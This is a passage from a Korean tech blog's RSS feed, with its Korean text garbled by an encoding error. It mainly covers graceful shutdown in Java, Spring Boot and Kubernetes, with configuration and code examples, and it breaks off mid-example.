id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://nginx.org/en/docs/">Nginx Documentation</a></li><li><a href="http://www.haproxy.org/">HAProxy Documentation</a></li><li><a href="https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/">What is a Reverse Proxy? - Cloudflare</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/CS/">CS</category>
      
      <category domain="https://ckck803.github.io/categories/CS/Network/">Network</category>
      
      
      
      <comments>https://ckck803.github.io/2025/12/11/computer-science/network/reverse-proxy/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ìš°ì•„í•œ ì¢…ë£Œ (Graceful Shutdown)</title>
      <link>https://ckck803.github.io/2025/12/11/java/graceful-shutdown/</link>
      <guid>https://ckck803.github.io/2025/12/11/java/graceful-shutdown/</guid>
      <pubDate>Wed, 10 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;Graceful-Shutdownì´ë€&quot;&gt;&lt;a href=&quot;#Graceful-Shutdownì´ë€&quot; class=&quot;headerlink&quot; title=&quot;Graceful Shutdownì´ë€?&quot;&gt;&lt;/a&gt;Graceful Shutdownì´ë€?&lt;/h2&gt;&lt;p&gt;Graceful Shutdownì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì¢…ë£Œë  ë•Œ í˜„ì¬ ì²˜ë¦¬ ì¤‘ì¸ ì‘ì—…ì„ ì•ˆì „í•˜ê²Œ ì™„ë£Œí•˜ê³ , ë¦¬ì†ŒìŠ¤ë¥¼ ì •ë¦¬í•œ í›„ ì¢…ë£Œí•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. ê°‘ì‘ìŠ¤ëŸ¬ìš´ ì¢…ë£Œ(Abrupt Shutdown)ì™€ ë‹¬ë¦¬, ì§„í–‰ ì¤‘ì¸ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê³  ë°ì´í„° ì†ì‹¤ì„ ë°©ì§€í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;ì™œ-í•„ìš”í•œê°€&quot;&gt;&lt;a href=&quot;#ì™œ-í•„ìš”í•œê°€&quot; class=&quot;headerlink&quot; title=&quot;ì™œ í•„ìš”í•œê°€?&quot;&gt;&lt;/a&gt;ì™œ í•„ìš”í•œê°€?&lt;/h2&gt;&lt;h3 id=&quot;ì¼ë°˜ì ì¸-ì¢…ë£Œ-ë¬¸ì œì &quot;&gt;&lt;a href=&quot;#ì¼ë°˜ì ì¸-ì¢…ë£Œ-ë¬¸ì œì &quot; class=&quot;headerlink&quot; title=&quot;ì¼ë°˜ì ì¸ ì¢…ë£Œ ë¬¸ì œì &quot;&gt;&lt;/a&gt;ì¼ë°˜ì ì¸ ì¢…ë£Œ ë¬¸ì œì &lt;/h3&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ê°‘ì‘ìŠ¤ëŸ¬ìš´ ì¢…ë£Œ ì‹œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ë¬¸ì œë“¤&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- ì²˜ë¦¬ ì¤‘ì¸ HTTP ìš”ì²­ì´ ì¤‘ë‹¨ë¨&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- ë°ì´í„°ë² ì´ìŠ¤ íŠ¸ëœì­ì…˜ì´ ë¡¤ë°±ë¨&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- íŒŒì¼ ì“°ê¸° ì‘ì—…ì´ ì¤‘ë‹¨ë˜ì–´ ë°ì´í„° ì†ì‹¤&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- ì™¸ë¶€ API í˜¸ì¶œì´ íƒ€ì„ì•„ì›ƒ&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- ë©”ì‹œì§€ íì˜ ë©”ì‹œì§€ê°€ ì†ì‹¤ë¨&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;Graceful-Shutdownì˜-ì´ì &quot;&gt;&lt;a href=&quot;#Graceful-Shutdownì˜-ì´ì &quot; class=&quot;headerlink&quot; title=&quot;Graceful Shutdownì˜ ì´ì &quot;&gt;&lt;/a&gt;Graceful Shutdownì˜ ì´ì &lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ë°ì´í„° ë¬´ê²°ì„±&lt;/strong&gt;: ì§„í–‰ ì¤‘ì¸ íŠ¸ëœì­ì…˜ì„ ì™„ë£Œ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ì‚¬ìš©ì ê²½í—˜&lt;/strong&gt;: ì§„í–‰ ì¤‘ì¸ ìš”ì²­ì— ëŒ€í•œ ì •ìƒ ì‘ë‹µ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ë¦¬ì†ŒìŠ¤ ì •ë¦¬&lt;/strong&gt;: ì—°ê²°, íŒŒì¼, ìŠ¤ë ˆë“œ ë“± ì •ë¦¬&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ë¬´ì¤‘ë‹¨ ë°°í¬&lt;/strong&gt;: ë¡¤ë§ ì—…ë°ì´íŠ¸ ì‹œ ì„œë¹„ìŠ¤ ì¤‘ë‹¨ ìµœì†Œí™”&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;JVM-Shutdown-Hook&quot;&gt;&lt;a href=&quot;#JVM-Shutdown-Hook&quot; class=&quot;headerlink&quot; title=&quot;JVM Shutdown Hook&quot;&gt;&lt;/a&gt;JVM Shutdown Hook&lt;/h2&gt;&lt;p&gt;JVMì€ ì¢…ë£Œ ì‹œ ë“±ë¡ëœ Shutdown Hookì„ ì‹¤í–‰í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;ê¸°ë³¸-ì‚¬ìš©ë²•&quot;&gt;&lt;a href=&quot;#ê¸°ë³¸-ì‚¬ìš©ë²•&quot; class=&quot;headerlink&quot; title=&quot;ê¸°ë³¸ ì‚¬ìš©ë²•&quot;&gt;&lt;/a&gt;ê¸°ë³¸ ì‚¬ìš©ë²•&lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Graceful-Shutdownì´ë€"><a href="#Graceful-Shutdownì´ë€" class="headerlink" title="Graceful Shutdownì´ë€?"></a>Graceful Shutdownì´ë€?</h2><p>Graceful Shutdownì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì¢…ë£Œë  ë•Œ í˜„ì¬ ì²˜ë¦¬ ì¤‘ì¸ ì‘ì—…ì„ ì•ˆì „í•˜ê²Œ ì™„ë£Œí•˜ê³ , ë¦¬ì†ŒìŠ¤ë¥¼ ì •ë¦¬í•œ í›„ ì¢…ë£Œí•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. ê°‘ì‘ìŠ¤ëŸ¬ìš´ ì¢…ë£Œ(Abrupt Shutdown)ì™€ ë‹¬ë¦¬, ì§„í–‰ ì¤‘ì¸ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê³  ë°ì´í„° ì†ì‹¤ì„ ë°©ì§€í•©ë‹ˆë‹¤.</p><h2 id="ì™œ-í•„ìš”í•œê°€"><a href="#ì™œ-í•„ìš”í•œê°€" class="headerlink" title="ì™œ í•„ìš”í•œê°€?"></a>ì™œ í•„ìš”í•œê°€?</h2><h3 id="ì¼ë°˜ì ì¸-ì¢…ë£Œ-ë¬¸ì œì "><a href="#ì¼ë°˜ì ì¸-ì¢…ë£Œ-ë¬¸ì œì " class="headerlink" title="ì¼ë°˜ì ì¸ ì¢…ë£Œ ë¬¸ì œì "></a>ì¼ë°˜ì ì¸ ì¢…ë£Œ ë¬¸ì œì </h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ê°‘ì‘ìŠ¤ëŸ¬ìš´ ì¢…ë£Œ ì‹œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ë¬¸ì œë“¤</span></span><br><span class="line">- ì²˜ë¦¬ ì¤‘ì¸ HTTP ìš”ì²­ì´ ì¤‘ë‹¨ë¨</span><br><span class="line">- ë°ì´í„°ë² ì´ìŠ¤ íŠ¸ëœì­ì…˜ì´ ë¡¤ë°±ë¨</span><br><span class="line">- íŒŒì¼ ì“°ê¸° ì‘ì—…ì´ ì¤‘ë‹¨ë˜ì–´ ë°ì´í„° ì†ì‹¤</span><br><span class="line">- ì™¸ë¶€ API í˜¸ì¶œì´ íƒ€ì„ì•„ì›ƒ</span><br><span class="line">- ë©”ì‹œì§€ íì˜ ë©”ì‹œì§€ê°€ ì†ì‹¤ë¨</span><br></pre></td></tr></table></figure><h3 id="Graceful-Shutdownì˜-ì´ì "><a href="#Graceful-Shutdownì˜-ì´ì " class="headerlink" title="Graceful Shutdownì˜ ì´ì "></a>Graceful Shutdownì˜ ì´ì </h3><ol><li><strong>ë°ì´í„° ë¬´ê²°ì„±</strong>: ì§„í–‰ ì¤‘ì¸ íŠ¸ëœì­ì…˜ì„ ì™„ë£Œ</li><li><strong>ì‚¬ìš©ì ê²½í—˜</strong>: ì§„í–‰ ì¤‘ì¸ ìš”ì²­ì— ëŒ€í•œ ì •ìƒ ì‘ë‹µ</li><li><strong>ë¦¬ì†ŒìŠ¤ ì •ë¦¬</strong>: ì—°ê²°, íŒŒì¼, ìŠ¤ë ˆë“œ ë“± ì •ë¦¬</li><li><strong>ë¬´ì¤‘ë‹¨ ë°°í¬</strong>: ë¡¤ë§ ì—…ë°ì´íŠ¸ ì‹œ ì„œë¹„ìŠ¤ ì¤‘ë‹¨ ìµœì†Œí™”</li></ol><h2 id="JVM-Shutdown-Hook"><a href="#JVM-Shutdown-Hook" class="headerlink" title="JVM Shutdown Hook"></a>JVM Shutdown Hook</h2><p>JVMì€ ì¢…ë£Œ ì‹œ ë“±ë¡ëœ Shutdown Hookì„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><h3 id="ê¸°ë³¸-ì‚¬ìš©ë²•"><a href="#ê¸°ë³¸-ì‚¬ìš©ë²•" class="headerlink" title="ê¸°ë³¸ ì‚¬ìš©ë²•"></a>ê¸°ë³¸ ì‚¬ìš©ë²•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShutdownHookExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Shutdown Hook ë“±ë¡</span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Shutdown Hook ì‹¤í–‰ ì¤‘...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ë¦¬ì†ŒìŠ¤ ì •ë¦¬ ì‘ì—…</span></span><br><span class="line">            closeConnections();</span><br><span class="line">            saveState();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;ì •ë¦¬ ì‘ì—… ì™„ë£Œ&quot;</span>);</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹¤í–‰ ì¤‘...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œì§</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">closeConnections</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// DB ì—°ê²°, ì†Œì¼“ ë“± ì¢…ë£Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">saveState</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// í˜„ì¬ ìƒíƒœ ì €ì¥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Shutdown-Hook-ì‹¤í–‰-ì‹œì "><a href="#Shutdown-Hook-ì‹¤í–‰-ì‹œì " class="headerlink" title="Shutdown Hook ì‹¤í–‰ ì‹œì "></a>Shutdown Hook ì‹¤í–‰ ì‹œì </h3><p>ë‹¤ìŒê³¼ ê°™ì€ ê²½ìš°ì— Shutdown Hookì´ ì‹¤í–‰ë©ë‹ˆë‹¤:</p><ul><li>ì •ìƒ ì¢…ë£Œ (System.exit())</li><li>SIGTERM ì‹œê·¸ë„ ìˆ˜ì‹ </li><li>Ctrl+C (SIGINT)</li><li>OutOfMemoryError ë“± ì¹˜ëª…ì  ì˜¤ë¥˜</li></ul><p><strong>ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ê²½ìš°:</strong></p><ul><li>SIGKILL (kill -9)</li><li>JVM í¬ë˜ì‹œ</li><li>ìš´ì˜ì²´ì œ ê°•ì œ ì¢…ë£Œ</li></ul><h2 id="Spring-Bootì—ì„œì˜-Graceful-Shutdown"><a href="#Spring-Bootì—ì„œì˜-Graceful-Shutdown" class="headerlink" title="Spring Bootì—ì„œì˜ Graceful Shutdown"></a>Spring Bootì—ì„œì˜ Graceful Shutdown</h2><h3 id="ì„¤ì •-ë°©ë²•"><a href="#ì„¤ì •-ë°©ë²•" class="headerlink" title="ì„¤ì • ë°©ë²•"></a>ì„¤ì • ë°©ë²•</h3><p>Spring Boot 2.3 ì´ìƒì—ì„œëŠ” ë‚´ì¥ ì§€ì›í•©ë‹ˆë‹¤.</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">shutdown:</span> <span class="string">graceful</span>  <span class="comment"># graceful ë˜ëŠ” immediate (ê¸°ë³¸ê°’)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">lifecycle:</span></span><br><span class="line">    <span class="attr">timeout-per-shutdown-phase:</span> <span class="string">30s</span>  <span class="comment"># ìµœëŒ€ ëŒ€ê¸° ì‹œê°„ (ê¸°ë³¸ 30ì´ˆ)</span></span><br></pre></td></tr></table></figure><p>ë˜ëŠ” properties íŒŒì¼:</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.shutdown</span>=<span class="string">graceful</span></span><br><span class="line"><span class="attr">spring.lifecycle.timeout-per-shutdown-phase</span>=<span class="string">30s</span></span><br></pre></td></tr></table></figure><h3 id="ë™ì‘-ë°©ì‹"><a href="#ë™ì‘-ë°©ì‹" class="headerlink" title="ë™ì‘ ë°©ì‹"></a>ë™ì‘ ë°©ì‹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ì¢…ë£Œ ì‹ í˜¸ ìˆ˜ì‹  (SIGTERM)</span><br><span class="line">   â†“</span><br><span class="line">2. ìƒˆë¡œìš´ ìš”ì²­ ê±°ë¶€ (503 Service Unavailable)</span><br><span class="line">   â†“</span><br><span class="line">3. ì§„í–‰ ì¤‘ì¸ ìš”ì²­ ì²˜ë¦¬ ì™„ë£Œ ëŒ€ê¸°</span><br><span class="line">   â†“</span><br><span class="line">4. íƒ€ì„ì•„ì›ƒ ë˜ëŠ” ëª¨ë“  ìš”ì²­ ì™„ë£Œ</span><br><span class="line">   â†“</span><br><span class="line">5. Bean ì†Œë©¸ (PreDestroy)</span><br><span class="line">   â†“</span><br><span class="line">6. ì• í”Œë¦¬ì¼€ì´ì…˜ ì¢…ë£Œ</span><br></pre></td></tr></table></figure><h3 id="PreDestroyë¥¼-í™œìš©í•œ-ì •ë¦¬-ì‘ì—…"><a href="#PreDestroyë¥¼-í™œìš©í•œ-ì •ë¦¬-ì‘ì—…" class="headerlink" title="PreDestroyë¥¼ í™œìš©í•œ ì •ë¦¬ ì‘ì—…"></a>PreDestroyë¥¼ í™œìš©í•œ ì •ë¦¬ ì‘ì—…</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GracefulShutdownHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ExecutorService executorService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PreDestroy</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onShutdown</span><span class="params">()</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;Graceful Shutdown ì‹œì‘&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. ExecutorService ì¢…ë£Œ</span></span><br><span class="line">        shutdownExecutor();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ìºì‹œ ì €ì¥</span></span><br><span class="line">        saveCache();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. ì—°ê²° ì¢…ë£Œ</span></span><br><span class="line">        closeConnections();</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;Graceful Shutdown ì™„ë£Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">shutdownExecutor</span><span class="params">()</span> &#123;</span><br><span class="line">        executorService.shutdown();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!executorService.awaitTermination(<span class="number">30</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">                executorService.shutdownNow();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            executorService.shutdownNow();</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">saveCache</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ë©”ëª¨ë¦¬ ìºì‹œë¥¼ ë””ìŠ¤í¬ì— ì €ì¥</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">closeConnections</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// DB, Redis ë“± ì—°ê²° ì¢…ë£Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SmartLifecycle-ì¸í„°í˜ì´ìŠ¤"><a href="#SmartLifecycle-ì¸í„°í˜ì´ìŠ¤" class="headerlink" title="SmartLifecycle ì¸í„°í˜ì´ìŠ¤"></a>SmartLifecycle ì¸í„°í˜ì´ìŠ¤</h2><p>ë” ì„¸ë°€í•œ ì œì–´ê°€ í•„ìš”í•œ ê²½ìš° SmartLifecycleì„ êµ¬í˜„í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GracefulShutdownLifecycle</span> <span class="keyword">implements</span> <span class="title class_">SmartLifecycle</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">running</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        running = <span class="literal">true</span>;</span><br><span class="line">        log.info(<span class="string">&quot;ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;Graceful Shutdown ì‹œì‘&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì§„í–‰ ì¤‘ì¸ ì‘ì—… ì™„ë£Œ ëŒ€ê¸°</span></span><br><span class="line">        waitForTasksToComplete();</span><br><span class="line"></span><br><span class="line">        running = <span class="literal">false</span>;</span><br><span class="line">        log.info(<span class="string">&quot;Graceful Shutdown ì™„ë£Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isRunning</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> running;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPhase</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MAX_VALUE; <span class="comment">// ê°€ì¥ ë§ˆì§€ë§‰ì— ì¢…ë£Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">waitForTasksToComplete</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ì‘ì—… ì™„ë£Œ ëŒ€ê¸° ë¡œì§</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kubernetes-í™˜ê²½ì—ì„œì˜-Graceful-Shutdown"><a href="#Kubernetes-í™˜ê²½ì—ì„œì˜-Graceful-Shutdown" class="headerlink" title="Kubernetes í™˜ê²½ì—ì„œì˜ Graceful Shutdown"></a>Kubernetes í™˜ê²½ì—ì„œì˜ Graceful Shutdown</h2><h3 id="Pod-ì¢…ë£Œ-í”„ë¡œì„¸ìŠ¤"><a href="#Pod-ì¢…ë£Œ-í”„ë¡œì„¸ìŠ¤" class="headerlink" title="Pod ì¢…ë£Œ í”„ë¡œì„¸ìŠ¤"></a>Pod ì¢…ë£Œ í”„ë¡œì„¸ìŠ¤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. kubectl delete pod ì‹¤í–‰</span><br><span class="line">   â†“</span><br><span class="line">2. Pod ìƒíƒœë¥¼ Terminatingìœ¼ë¡œ ë³€ê²½</span><br><span class="line">   â†“</span><br><span class="line">3. SIGTERM ì‹ í˜¸ë¥¼ ì»¨í…Œì´ë„ˆì— ì „ì†¡</span><br><span class="line">   â†“</span><br><span class="line">4. terminationGracePeriodSeconds ëŒ€ê¸° (ê¸°ë³¸ 30ì´ˆ)</span><br><span class="line">   â†“</span><br><span class="line">5. íƒ€ì„ì•„ì›ƒ ì‹œ SIGKILL ì „ì†¡</span><br></pre></td></tr></table></figure><h3 id="ì„¤ì •-ì˜ˆì‹œ"><a href="#ì„¤ì •-ì˜ˆì‹œ" class="headerlink" title="ì„¤ì • ì˜ˆì‹œ"></a>ì„¤ì • ì˜ˆì‹œ</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">60</span>  <span class="comment"># 60ì´ˆ ëŒ€ê¸°</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">my-app:latest</span></span><br><span class="line">    <span class="attr">lifecycle:</span></span><br><span class="line">      <span class="attr">preStop:</span></span><br><span class="line">        <span class="attr">exec:</span></span><br><span class="line">          <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sleep 15&quot;</span>]  <span class="comment"># ë¡œë“œë°¸ëŸ°ì„œ ì œê±° ëŒ€ê¸°</span></span><br></pre></td></tr></table></figure><h3 id="Spring-Boot-Kubernetes-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤"><a href="#Spring-Boot-Kubernetes-ë² ìŠ¤íŠ¸-í”„ë™í‹°ìŠ¤" class="headerlink" title="Spring Boot + Kubernetes ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤"></a>Spring Boot + Kubernetes ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># deployment.yaml</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">60</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">lifecycle:</span></span><br><span class="line">      <span class="attr">preStop:</span></span><br><span class="line">        <span class="attr">exec:</span></span><br><span class="line">          <span class="attr">command:</span> [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sleep 10&quot;</span>]  <span class="comment"># íŠ¸ë˜í”½ ì°¨ë‹¨ ëŒ€ê¸°</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">shutdown:</span> <span class="string">graceful</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">lifecycle:</span></span><br><span class="line">    <span class="attr">timeout-per-shutdown-phase:</span> <span class="string">45s</span>  <span class="comment"># K8s terminationGracePeriodSecondsë³´ë‹¤ ì§§ê²Œ</span></span><br></pre></td></tr></table></figure><h2 id="ì‹¤ì „-ì˜ˆì œ"><a href="#ì‹¤ì „-ì˜ˆì œ" class="headerlink" title="ì‹¤ì „ ì˜ˆì œ"></a>ì‹¤ì „ ì˜ˆì œ</h2><h3 id="HTTP-ìš”ì²­-ì²˜ë¦¬-ì¤‘-ì¢…ë£Œ"><a href="#HTTP-ìš”ì²­-ì²˜ë¦¬-ì¤‘-ì¢…ë£Œ" class="headerlink" title="HTTP ìš”ì²­ ì²˜ë¦¬ ì¤‘ ì¢…ë£Œ"></a>HTTP ìš”ì²­ ì²˜ë¦¬ ì¤‘ ì¢…ë£Œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LongRunningController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/long-task&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longTask</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;Long task ì‹œì‘&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 30ì´ˆ ê±¸ë¦¬ëŠ” ì‘ì—…</span></span><br><span class="line">        Thread.sleep(<span class="number">30000</span>);</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;Long task ì™„ë£Œ&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ì‘ì—… ì™„ë£Œ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Graceful Shutdown ì„¤ì • ì‹œ:</strong></p><ul><li>ì¢…ë£Œ ì‹ í˜¸ë¥¼ ë°›ì•„ë„ ì´ë¯¸ ì‹œì‘ëœ ìš”ì²­ì€ ì™„ë£Œë¨</li><li>ìƒˆë¡œìš´ ìš”ì²­ì€ 503 ì‘ë‹µ</li></ul><p><strong>ì¼ë°˜ ì¢…ë£Œ ì‹œ:</strong></p><ul><li>ìš”ì²­ì´ ì¤‘ê°„ì— ëŠê¹€</li><li>í´ë¼ì´ì–¸íŠ¸ëŠ” ì—°ê²° ì˜¤ë¥˜ ë°œìƒ</li></ul><h3 id="ë¹„ë™ê¸°-ì‘ì—…-ì²˜ë¦¬"><a href="#ë¹„ë™ê¸°-ì‘ì—…-ì²˜ë¦¬" class="headerlink" title="ë¹„ë™ê¸° ì‘ì—… ì²˜ë¦¬"></a>ë¹„ë™ê¸° ì‘ì—… ì²˜ë¦¬</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ThreadPoolTaskExecutor <span class="title function_">taskExecutor</span><span class="params">()</span> &#123;</span><br><span 